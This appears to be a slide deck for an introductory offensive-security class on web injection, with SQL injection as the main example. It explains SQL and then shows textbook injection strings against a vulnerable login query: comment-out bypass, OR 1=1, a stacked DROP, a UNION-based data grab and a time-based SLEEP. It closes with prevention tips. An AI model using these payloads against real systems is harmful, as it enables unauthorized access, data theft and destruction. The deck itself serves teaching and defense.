---
layout: slide
title:  "Presentation 4 | Web Injection"
transition: slide
---

<section>

<img width="300px" src="{{site.baseurl}}/assets/images/code_academy.png">

<img width="300px" src="{{site.baseurl}}/assets/images/kali.png">

<h2>Offensive Security 101</h2>

<p><i>Web Injection</i></p>

</section>

<section>
	<h3>Disclaimer</h3>
	<p><i>Attacking networks is illegal; could get you arrested...</i></p>
	<p class="fragment"><i>...or even worse, fired!</i></p>
</section>

<section>
<h3>What is it?</h3>
<img class="fragment" width="500px" src="{{site.baseurl}}/assets/images/web_request.svg"><br />
<img class="fragment" width="500px" src="{{site.baseurl}}/assets/images/unexpected_web_request.svg">
</section>

<section data-markdown>

### Web Injection
- Top OWASP Security Risk
- SQL, NoSQL, LDAP, Command Injection etc.

</section>

<section data-markdown>

### Impact
- Steal Data
- Spoof Identity
- Remove/Corrupt Data
- System Takeover

</section>

<section data-markdown>
haveibeenpwned.com
</section>

<section data-markdown>
## SQL Injection
</section>

<section data-markdown>
### SQL
- Structured Query Language
- Relational Databases
- MySQL, Oracle, MS SQL Server, PostgreSQL
</section>

<section>
<h3>SQL</h3>
<table class="fragment">
	<caption>users</caption>
	<tr>
		<th>id</th>
		<th>username</th>
		<th>password</th>
	</tr>
	<tr>
		<td>1</td>
		<td>alice</td>
		<td>123456</td>
	</tr>
	<tr>
		<td>2</td>
		<td>bob</td>
		<td>password</td>
	</tr>
</table>
<pre class="fragment">
<code class="mysql">SELECT username, password FROM users WHERE user='alice';
</code>
</pre>
<table class="fragment">
	<tr>
		<th>username</th>
		<th>password</th>
	</tr>
	<tr>
		<td>alice</td>
		<td>123456</td>
	</tr>
</table>
</section>

<section>
<h3>SQL</h3>
<pre>
<code class="mysql">SELECT * FROM users WHERE username='alice';
INSERT INTO users (3, 'chuck', 'password');
DELETE FROM users WHERE id=1;
</code>
</pre>
</section>

<section>
<h3>SQL Injection</h3>
<img class="fragment" width="500px" src="{{site.baseurl}}/assets/images/web_request_with_db.svg"><br />
<img class="fragment" width="500px" src="{{site.baseurl}}/assets/images/unexpected_web_request_with_db.svg">
</section>

<section>
<h3>SQL Injection</h3>
<pre>
<code class="mysql">SELECT * FROM users 
WHERE username='$username' AND password='$password';</code>
</pre>
<pre>
<code class="php">$username = "alice"
$password = "123456"
</code>
<code class="mysql">SELECT * FROM users
WHERE username='alice' AND password='123456';
</code>
</pre>
</section>

<section>
<h3>SQL Injection</h3>
<pre>
<code class="mysql">SELECT * FROM users 
WHERE username='$username' AND password='$password';</code>
</pre>
<pre class="fragment">
<code class="php">$username = "alice';-- "</code>
</pre>
<pre class="fragment">
<code class="mysql">SELECT * FROM users
WHERE username='alice';-- ' AND password='$password';</code>
</pre>
</section>

<section>
<h3>SQL Injection</h3>
<pre>
<code class="mysql">SELECT * FROM users 
WHERE username='alice' OR 1=1;-- ' AND password=...</code>
</pre>
<pre class="fragment">
<code class="mysql">SELECT * FROM users WHERE username='alice';
DROP users;-- ' AND password=...
</code>
</pre>
<pre class="fragment">
<code class="mysql">SELECT * FROM users WHERE username='alice' 
UNION SELECT name, address, 1 from staff;-- ' AND password=...
</code>
</pre>
<pre class="fragment">
<code class="mysql">SELECT * FROM users 
WHERE username='alice' OR 1=SLEEP(15);-- ' AND password=...
</code>
</pre>
</section>

<section data-markdown>
### Demo
</section>

<section data-markdown>

### Prevention
- Suppress Errors
- Sanitize and filter inputs
- Limiting Privileges
- Paramaterized Queries

</section>

<section data-markdown>

## Fin

</section>
